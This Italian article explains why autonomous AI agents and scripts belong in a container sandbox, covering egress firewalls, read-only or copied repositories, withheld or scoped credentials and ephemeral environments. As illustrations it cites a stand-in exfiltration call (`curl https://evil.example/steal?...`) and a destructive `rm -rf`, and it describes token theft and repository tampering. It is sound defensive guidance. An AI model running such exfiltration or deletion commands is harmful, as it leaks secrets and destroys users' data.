---
title: "Eseguire agent AI in una sandbox sicura: come evitare token rubati e repository distrutti"
subtitle: "Quando dai autonomia a uno script “intelligente”, devi presumere il peggio: rete e filesystem vanno confinati, e i segreti non devono essere leggibili."
description: "Gli agent AI e gli script automatizzati possono eseguire comandi, modificare file e fare chiamate di rete. Se qualcosa va storto (o se il pacchetto è malevolo), i danni possono essere immediati: esfiltrazione di token, cancellazioni in repo, modifiche non volute. In questo articolo vediamo perché una sandbox è fondamentale e quali controlli minimi servono per confinare rete, filesystem e credenziali, con un approccio pratico basato su container."
publishedAt: 2026-07-02
tags: ["sandboxing","sicurezza-credenziali","docker","agent-ai","firewall-uscita"]
---
Gli agent AI che “lavorano da soli” (generando codice, eseguendo comandi, installando dipendenze, applicando patch) sono comodi, ma spostano il problema dalla produttività alla **superficie d’attacco**. Non serve un exploit sofisticato: basta un pacchetto o uno script apparentemente utile che, in realtà, prova a fare due cose molto semplici e molto devastanti:

1. **Esfiltrare segreti** (token GitHub, chiavi API, variabili d’ambiente).
2. **Manomettere il progetto** (cancellare file, riscrivere configurazioni, alterare pipeline).

La buona notizia è che questo tipo di attacchi è spesso bloccabile con una strategia chiara: **eseguire tutto in una sandbox** dove rete, filesystem e credenziali sono sotto controllo.

## Il problema reale: automazione + permessi = danno immediato
Un agente con accesso alla tua working directory e alla rete può:

- leggere un token presente in variabili d’ambiente o file di config;
- inviarlo a un endpoint esterno con una banale `curl`;
- cancellare file “scomodi” o importanti (config, lockfile, sorgenti), magari simulando un refactor;
- creare commit, aprire PR, cambiare workflow CI.

Il punto critico è che **molte di queste azioni non richiedono privilegi elevati**: un normale utente con accesso alla cartella del progetto e alla rete in uscita può già fare abbastanza danni.

## Perché una sandbox funziona: tre barriere fondamentali
Una sandbox efficace non è “un ambiente separato” in senso generico: è un insieme di vincoli tecnici che rendono inutili i comportamenti malevoli.

### 1) Firewall in uscita: bloccare l’esfiltrazione
La forma più comune di furto è “leggo il segreto e lo mando fuori”. Se la sandbox:

- **nega la rete in uscita** di default, oppure
- consente solo una **allowlist** di domini necessari (es. registry, mirror interni)

allora anche uno script malevolo che prova a fare `curl https://evil.example/steal?...` fallisce per design.

Questo è spesso il *singolo controllo* che fa la differenza tra “incidente” e “tentativo bloccato”.

### 2) Filesystem confinato: niente cancellazioni irreversibili
Se l’agente gira direttamente nel tuo repo locale, un `rm -rf` è un disastro. In sandbox invece vuoi:

- un filesystem **isolato** (container/VM);
- montare il progetto in modalità **read-only** quando possibile;
- oppure lavorare su una **copia** (checkout temporaneo) e riportare fuori solo le modifiche attese.

Così, anche se un comando tenta di eliminare file, l’effetto rimane dentro l’ambiente confinato e non “tocca” la sorgente reale.

### 3) Sicurezza delle credenziali: segreti non leggibili (o sostituiti)
Un errore tipico è passare al container le stesse variabili d’ambiente del sistema host. In una sandbox ben fatta:

- i **segreti non vengono iniettati** a meno che sia indispensabile;
- se servono, vengono iniettati come credenziali **scopate** (scope ridotto, TTL breve, permessi minimi);
- idealmente l’ambiente restituisce **valori fittizi** o “mascherati” dove possibile, così il codice non può mai vedere il token reale.

Risultato: anche se lo script tenta di stampare o inviare un token, non ottiene nulla di utile.

## Un approccio pratico: sandbox basata su container
Per molti workflow frontend (codegen, refactor, linting, test, patch automatiche), un container è un buon compromesso: veloce da avviare, riproducibile, facile da buttare via.

Una configurazione sensata punta a:

- container **ephemeral** (si distrugge a fine run);
- filesystem isolato, repo montato **RO** o su copy-on-write;
- **niente accesso** alle credenziali dell’host per default;
- rete in uscita **bloccata** o fortemente limitata;
- logging degli step eseguiti (almeno per audit e debugging).

Non è necessario rendere “impossibile ogni cosa”: l’obiettivo è rendere **improbabile e non conveniente** il comportamento malevolo, e soprattutto limitare l’impatto se succede.

## Checklist minima per far lavorare un agente senza farsi male
Se stai per far girare un agente AI su una repo vera, questi sono i controlli che vale la pena considerare come baseline:

1. **Deny-all egress** (o allowlist). Se l’agente deve scaricare dipendenze, valuta mirror interni o domini specifici.
2. **Repo in read-only**, oppure lavora su una copia temporanea e applica patch “a valle”.
3. **Nessun token reale** nell’ambiente. Se serve GitHub, usa token a privilegi minimi e solo per operazioni specifiche.
4. **Ambiente effimero**: tutto si può distruggere e ricreare.
5. **Limiti di risorse** (CPU/RAM/timeouts) per evitare loop o comportamenti runaway.

## Sintesi: autonomia sì, fiducia cieca no
Gli agent AI sono strumenti potenti, ma vanno trattati come qualunque automazione capace di eseguire comandi: **potenzialmente pericolosa** se non confinata. Una sandbox ben progettata trasforma un attacco banale (esfiltrare un token, cancellare file) in un tentativo sterile: niente rete utile, niente segreti reali, niente danni permanenti al repository.

Se l’obiettivo è aumentare la produttività senza aprire nuove porte alla supply chain, la sandbox non è un “di più”: è la condizione necessaria per usare davvero gli agent in modo professionale.
